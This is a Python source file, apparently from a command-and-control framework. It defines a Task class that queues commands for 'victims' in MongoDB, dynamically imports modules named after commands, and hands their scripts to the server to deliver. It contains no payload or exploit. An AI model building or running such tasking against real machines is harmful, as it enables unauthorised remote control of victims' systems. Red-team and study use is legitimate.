import pdb
import os
import pathlib
import sys
from lib.module import Module

class Task:

	mongoclient = None
	tasks = {}
	databasename = os.environ['MONGODB_DATABASE']

	def __init__(self,victim_id,command,language,utility,options,task_id,output=None,issued=False,add_db=True):

		self.task_id = task_id
		self.victim_id = victim_id
		self.command = command
		self.output = output
		self.issued = issued
		self.options = options
		self.language = language
		self.utility = utility
		self.tasks[self.task_id] = self

		if add_db : self.insert_cmd_db()


	## Loads the first uninssued task in database
	@classmethod
	def find_unissued_task(cls,victim_id):
		mydb = cls.mongoclient[cls.databasename]
		tasks = mydb["tasks"]

		## Finding only the commands for this victim id and which hasn't been issued yet
		x = tasks.find_one({'victim_id': victim_id, 'issued':False})
		return x

	## Takes in pymongo task object, makes task objects.
	@classmethod
	def load_task(cls,task):
		
		task_obj = Task(victim_id = task['victim_id'], command = task['command'], language= task['language'], utility = task['utility'], options = task['options'] , task_id = task['task_id'], output = task['output'],issued = task['issued'],add_db = False)
		
		cls.tasks[task_obj.task_id] = task_obj

		return task_obj

	## Updates the whole task according to the current object state
	def update_task_to_db(self,attribute):
		mydb = self.mongoclient[self.databasename]
		tasks = mydb["tasks"]

		h = {'task_id':self.task_id}
		
		tasks.find_one_and_update(h,{ "$set": {attribute : getattr(self,attribute)} })

	## Updates the task issuance and output status from DB
	def update_task_from_db(self):
		mydb = self.mongoclient[self.databasename]
		tasks = mydb["tasks"]

		h = {'task_id':self.task_id}
		
		task = tasks.find_one(h)

		if task:
			self.issued = task['issued']
			self.output = task['output']

	## Creates an object of the respective Module Class, loads in dict and returns needed info to be sent by server
	def issue_dict(self):
		language = self.language
		utility = self.utility

		module_folder = os.path.join(str(pathlib.Path(__file__).parent.resolve()), "../modules",utility)

		sys.path.append(module_folder)
		mod = __import__(self.command)
		
		## capitalize the first letter
		module_name = self.command.title()
		
		## Needed module object is made here to be issued
		module_obj = getattr(mod,module_name)(name=self.command,utility = utility, language=language,options=self.options)
		
		## Storing the mapping to access later
		Module.module_task_id[self.task_id] = module_obj

		self.issued = True
		self.update_task_to_db('issued')
		return {'task_id': self.task_id, 'language': language, 'command': self.command, 'script': module_obj.script}

	## Insert the command output in the Database
	def insert_cmd_output(self,output):
		self.output = output

		mydb = self.mongoclient[self.databasename]
		tasks = mydb["tasks"]

		h = {'task_id':self.task_id}

		tasks.find_one_and_update(h,{ "$set": { "output": output } })

	## Inserts a command issued to a victim in the db
	def insert_cmd_db(self):
		
		mydb = self.mongoclient[self.databasename]
		tasks = mydb["tasks"]

		h = {'task_id': self.task_id,'victim_id': self.victim_id, 'command':self.command, 'language':self.language, 'utility': self.utility, 'options':self.options, 'output':self.output ,'issued': self.issued}

		tasks.insert_one(h)